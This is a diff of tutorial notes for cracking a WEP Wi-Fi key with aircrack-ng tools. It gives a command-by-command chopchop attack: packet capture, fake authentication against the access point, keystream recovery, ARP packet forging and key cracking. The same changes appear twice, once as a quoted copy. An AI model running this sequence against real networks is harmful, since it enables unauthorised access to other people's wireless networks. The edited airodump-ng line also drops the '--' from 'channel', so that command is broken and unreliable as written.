@@ -8,28 +8,28 @@ key.
 
 2. Access point verification.
 $ sudo airodump-ng wlan0
->>> note the BSSID MAC: MAC of the access point.
+>>> note the BSSID: MAC of the access point.
 >>> note the ESSID:     name of the access point.
 
 3. Packets recording with airodump-ng.
-$ sudo airodump-ng --channel <ch> -w chopchop wlan0
+$ sudo airodump-ng --bssid <BSSID> channel <ch> -w chopchop wlan0
 
 4. Performs a fake authentication.
 Accelerate the number of authentication.
 Use '-1' or '--fakeauth'.
-$ sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID MAC> -h <kali MAC> wlan0
+$ sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <kali MAC> wlan0
 >>> -1 0 : do the fake just one time.
 >>> authentification to the acces point. The acces point accepts our MAC address and will listen 
     our packets.
 
 5. Attack with chopchop.
-$ sudo aireplay-ng --chopchop -b <BSSID MAC> -h <MAC kali> wlan0
+$ sudo aireplay-ng --chopchop -b <BSSID> -h <MAC kali> wlan0
 >>> airreplay-ng searches for an ARP packet then ...
 >>> ... propose "Use this packet ?". Say yed (y) then wait for the end of the operation. 
 >>> note the name of the 'keystream' file. 
 
 6. Forge a packet.
-$ sudo packetforge-ng -0 -a <BSSID MAC> -h <MAC kali> -k 255.255.255.255 -l 255.255.255.255. 
+$ sudo packetforge-ng -0 -a <BSSID> -h <MAC kali> -k 255.255.255.255 -l 255.255.255.255. 
                       -y <keystream.xor file> -w paquetchopchop
 >>> -0 means create an ARP packet.
 
@@ -58,28 +58,28 @@ $ sudo aircrack-ng chopchop-01.cap
 >@
 >@2. Access point verification.
 >@$ sudo airodump-ng wlan0
->@>>> note the BSSID MAC: MAC of the access point.
+>@>>> note the BSSID: MAC of the access point.
 >@>>> note the ESSID:     name of the access point.
 >@
 >@3. Packets recording with airodump-ng.
->@$ sudo airodump-ng --channel <ch> -w chopchop wlan0
+>@$ sudo airodump-ng --bssid <BSSID> channel <ch> -w chopchop wlan0
 >@
 >@4. Performs a fake authentication.
 >@Accelerate the number of authentication.
 >@Use '-1' or '--fakeauth'.
->@$ sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID MAC> -h <kali MAC> wlan0
+>@$ sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <kali MAC> wlan0
 >@>>> -1 0 : do the fake just one time.
 >@>>> authentification to the acces point. The acces point accepts our MAC address and will listen 
 >@    our packets.
 >@
 >@5. Attack with chopchop.
->@$ sudo aireplay-ng --chopchop -b <BSSID MAC> -h <MAC kali> wlan0
+>@$ sudo aireplay-ng --chopchop -b <BSSID> -h <MAC kali> wlan0
 >@>>> airreplay-ng searches for an ARP packet then ...
 >@>>> ... propose "Use this packet ?". Say yed (y) then wait for the end of the operation. 
 >@>>> note the name of the 'keystream' file. 
 >@
 >@6. Forge a packet.
->@$ sudo packetforge-ng -0 -a <BSSID MAC> -h <MAC kali> -k 255.255.255.255 -l 255.255.255.255. 
+>@$ sudo packetforge-ng -0 -a <BSSID> -h <MAC kali> -k 255.255.255.255 -l 255.255.255.255. 
 >@                      -y <keystream.xor file> -w paquetchopchop
 >@>>> -0 means create an ARP packet.
 >@
